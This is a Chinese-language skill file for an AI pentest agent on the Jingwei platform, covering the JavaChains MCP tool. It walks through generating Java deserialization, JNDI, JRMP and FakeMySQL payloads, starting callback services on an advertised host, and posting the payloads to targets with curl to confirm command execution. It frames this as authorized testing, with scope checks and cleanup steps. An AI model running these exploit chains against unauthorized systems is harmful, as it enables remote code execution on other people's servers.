---
name: java-chains
description: 通过 JavaChains MCP 生成 Java 反序列化/JNDI/JRMP/FakeMySQL payload，并验证目标回连或命令执行。需要构造 gadget、启动回调服务或排查 Java 利用链时使用；仅限已授权目标。
allowed-tools: Bash(playwright-cli:*) Bash(curl:*) Bash(bash:*)
mcps: JavaChains
---

# Java Chains 反序列化验证

Java Chains 是独立 sidecar，Jingwei 通过 `JavaChains` MCP 调用它的生成、服务与任务能力。加载本 Skill 后，MCP 工具会被解锁，实际工具名为 `mcp__JavaChains__java_chains_*`（下文简写为 `java_chains_*`）；**优先用 MCP，Web UI 只作降级和排障**。不要在未授权目标上使用。

## 前置检查

1. 确认目标在任务 scope 内，且已授权做利用验证。
2. 确认 `java_chains_*` 工具已出现在工具列表。若没有，说明 sidecar 未启动或 MCP 未配置：请操作员在宿主机启动 sidecar，执行 `bash deploy/java-chains-setup.sh`，再重启 Jingwei。不要伪造生成结果。
3. 确认入口类型、目标依赖、Content-Type/编码，以及目标能回连的地址（不是 `127.0.0.1`）。
4. 先做低破坏性证明：`id`/`whoami`、`sleep`、DNSLog 或 HTTP 回调。

## 推荐流程（MCP）

### 1. 选链

```
java_chains_presets_search {query:"fastjson"}       # 或 payload/tags/mode
java_chains_quick_generate  / java_chains_preset_get {id:"java.fastjson.exec"}
```

`preset_get` 会给出 `selectedPayload`、`inputs`、完整 `chain` 和示例请求。已知意图优先用 preset；没有匹配或要自定义链时再用 `java_chains_catalog_search` / `catalog_describe` / `chain_next`。

### 2. 生成 payload

```
java_chains_quick_generate {
  presetId:"java.fastjson.exec",
  payload:"JavaNativePayload",     // 必填，取 preset.selectedPayload
  inputs:{"cmd":"id"},
  responseMode:"summary"
}
```

返回 `artifact.artifactId`、`sha256`、`sizeBytes`、`download`。生成不会执行命令，只产生字节。

- **二进制 body**：用 raw artifact，下载后直接 `--data-binary` 注入。
- **文本参数**（Shiro cookie、base64/hex 参数）：在 `java_chains_generate` 里把 `request.payload.encode` 设为 `base64`/`hex`，再下载 artifact；不要手工拼编码。
- 下载字节（容器内可用）：

```bash
bash "${SKILL_DIR}/scripts/fetch-artifact.sh" <artifactId> /tmp/payload.bin
```

脚本使用容器环境里的 `JAVA_CHAINS_URL` 与 `JAVA_CHAINS_MCP_TOKEN`，不要打印 token。artifact 约 1 小时后过期，及时使用并删除。

自定义链用 `java_chains_chain_validate` 校验，然后：

```
java_chains_generate {
  request:{
    payload:{type:"JavaNativePayload", encode:"raw"},
    chain:[{"gadget":"..."},{"gadget":"...","args":{...}}]
  },
  responseMode:"summary"
}
```

### 3. JNDI / JRMP / FakeMySQL

有完整 preset 时，`java_chains_quick_jndi` 可一次完成校验、生成、发布：

```
java_chains_quick_jndi {
  presetId:"java.cb1.jndi.1",
  payload:"JNDILDAPDeserializePayload",
  inputs:{...},
  autoStart:true,
  bindHost:"0.0.0.0",
  advertisedHost:"<目标可达的宿主机 IP/域名>"
}
```

需要更细控制时：`java_chains_services_start`（`jndi`/`mysql`/`jrmp`/`tcp`/`http`）→ `java_chains_jobs_submit`（`protocol:"jndi"` 或 `"mysql"`，用 `presetId` 或 `request.chain`）→ `java_chains_jobs_watch` / `jobs_logs`。发布前用 `services_get` 确认端口、就绪状态和建议的对外地址。

回调端口：LDAP 50389、RMI 50388、HTTP 58080、JRMP 13999、FakeMySQL 3308、HTTP Server 50000、TCP 11527。默认只绑定 `127.0.0.1`；目标在远端时，请操作员把 `JAVA_CHAINS_CALLBACK_BIND` 改为 `0.0.0.0` 或指定网卡，重建 sidecar 并放行防火墙。

### 4. 注入与证据

用平台 HTTP/Bash 工具发送到已授权入口，外发请求走平台拦截/审批，不要绕过。

```bash
curl -sS -i -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @/tmp/payload.bin
```

证据优先级：命令回显 > JNDI/JRMP 回连日志 > DNSLog/HTTP 回调 > 时间盲注。记录 preset/chain、输入参数、artifact sha256、请求响应、`jobs_logs`/`services_get` 输出；把关键证据附到 finding。

### 5. 清理

```
java_chains_artifact_delete {artifactId:"..."}
java_chains_jobs_delete {taskId:"..."}
java_chains_services_stop {service:"jndi"}
```

删除 `/tmp/payload.bin`，恢复回调绑定和防火墙。若用过 Web UI，再执行 `playwright-cli close`。

## 降级：Web UI / REST

MCP 不可用时，仍可人工排障（`JAVA_CHAINS_URL` 是容器内地址，浏览器入口是宿主机 `http://localhost:9792`）：

```bash
curl -fsS -o /dev/null -w '%{http_code}\n' "$JAVA_CHAINS_URL"
playwright-cli open --browser chromium "$JAVA_CHAINS_URL"
playwright-cli snapshot
playwright-cli fill <用户名输入框ref> "admin"
playwright-cli fill <密码输入框ref> "$JAVA_CHAINS_PASS"
playwright-cli click <登录按钮ref>
```

用户名固定 `admin`，密码来自 `JAVA_CHAINS_PASS`。UI 模块：Payload Generation、JNDI Injection、JRMP Deserialization、MySQL JDBC Attack。ref 以当前 snapshot 为准。

底层 REST（仅排障）：`POST /auth/login`、`GET /api/capabilities`、`POST /api/generate/runs`；登录后使用会话 Cookie，不要复用过期会话。

## 排错

- **MCP 工具没解锁**：sidecar 未启动、`JAVA_CHAINS_MCP_TOKEN` 为空/失效，或 MCP 未启用。重跑 `deploy/java-chains-setup.sh` 后重启 Jingwei；确认 `docker logs jingwei-jingwei-1 | grep -i java-chains` 有注册/发现日志。
- **artifact 下载 403**：token 轮换后 Jingwei 还在用旧值 → 重启；确认 token 含 `generate` 与 `mcp:invoke`。
- **无回连**：先测目标到回调 IP/端口，再查 JDK、依赖版本、类黑名单和编码。
- **本地能打、目标不行**：常见是依赖/`serialVersionUID` 不匹配、入口编码或 Content-Type 不对、WAF；换链或换编码，不要盲目重放。

## 安全边界

- 只验证 scope 内资产；不持久化、不横向、不窃取凭据，除非任务明确授权。
- 回调端口没有认证，绝不能长期暴露公网；用完立即停止服务并恢复回环绑定。
- java-chains 闭源且无开源许可证，仅按官方方式拉取运行，不随 Jingwei 镜像/Release 分发。
